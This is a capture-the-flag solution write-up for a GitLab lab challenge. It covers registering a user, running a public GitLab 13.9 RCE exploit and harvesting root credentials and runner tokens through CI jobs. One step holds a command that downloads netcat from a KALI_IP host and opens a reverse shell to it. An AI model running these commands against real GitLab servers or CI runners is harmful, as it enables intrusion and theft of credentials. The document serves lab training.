# Runaway Solution

## Adding regular user account

The RCE exploit requires an authenticated account to work. As such, auto-registration is turned on and allows users to request their own accounts.

1. On the main gitlab login page register for a user account
2. Log into the system with the gitlab account

## RCE Exploit for Admin creds

1. From the GitLab login page request a user account
2. Log into the server as the user
3. Discover that the gitlab server is out of date (gitlab.challenge.us/help)
4. Find RCE for gitlab 13.9 (https://www.exploit-db.com/exploits/49944)
5. Download the exploit code
6. While trying to get the exploit to work host the file `/usr/bin/nc.traditional` on a python web server: `cp /usr/bin/nc.traditional /tmp && cd /tmp && python3 -m http.server`
7. Startup a nc listener (nc -n -vv -l -p 12345)
8. Run the exploit (python3 49944.py -u user -p pass@1 -c 'curl KALI_IP:8000/nc -o /var/tmp/nc && chmod +x /var/tmp/nc && /var/tmp/nc -e /bin/bash KALI_IP 12345' -t http://GITLAB_IP)
    * exploit still requires manual username and password entry for some reason
9. Through manual enumeration find gitlab root creds in /opt

## Creating a project

Using the normal user account you created in the previous step, log back into gitlab and create a new project

1. Click the green button that says: "New Project"
2. Choose "Create from Template"
3. Scroll to the bottom and choose: "Sample Gitlab Project" by clicking on the green button that says: "Use Template"
4. Template options:  
    * Project Name: Recon
    * Project Slug: Recon
    * Visibility Level: Public
5. CLick the "Create Project" button; This action will take some time while the project is created
6. Once the project is active click on the "Web IDE" button and create a new file called .gitlab-ci.yml. This is an example of a build file
```
stages:
  - test

Windows Test:
    stage: test
    script:
      - Write-Output "Hello World"

Linux Test:
    stage: test
    script:
      - echo "Hello World!"
````  

NOTE: There is a mixture of Windows and Linux hosts in the environment, so the job above will fail regardless of which runner is selected.

7. Save the changes by committing the file to the master branch

## Host Discovery

Once you have a project setup you can leverage the .gitlab-ci.yml file to probe the runners for tokens. By default any job will launch on any available runner.

To ensure we're hitting each runner

1. Log into the gitlab server as the root user and click on the wrench icon in the menu to enter the administration area
2. On the left side click on Overview -> Runners 
3. Pick a runner from the list and then click on the pencil icon to the left to edit the runner
4. Scroll to the bottom to the section where it says: "Project"
5. Select the project that was created above and tag the runner as only to be able to run to that particular project
6. Log out and log back in as the regular user account you created
7. Go to your project and modify the .gitlab-cl.yml file created in the previous step to include some basic bash/powershell scripts to probe the system.
8. Kick off your project through the CI build process. You should be able to see the results of the script you created. 

Token Location Reference: 
```
Runner-1 /home/user/token.txt
Runner-2 /opt/token.txt
Runner-3 C:\Users\User\Desktop\token.txt
Runner-4 C:\Users\Public\Documents\token.txt
Runner-5 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\token.txt
```

## Host Table
```
runner-1 -> Ubuntu 20.04  
runner-2 -> Ubuntu 20.04  
runner-3 -> Windows 10 Workstation  
runner-4 -> Windows 2019 Server  
runner-5 -> Windows 2019 Server  
```

## Submission

The tokens are generated by infinity and will change with each challenge iteration.
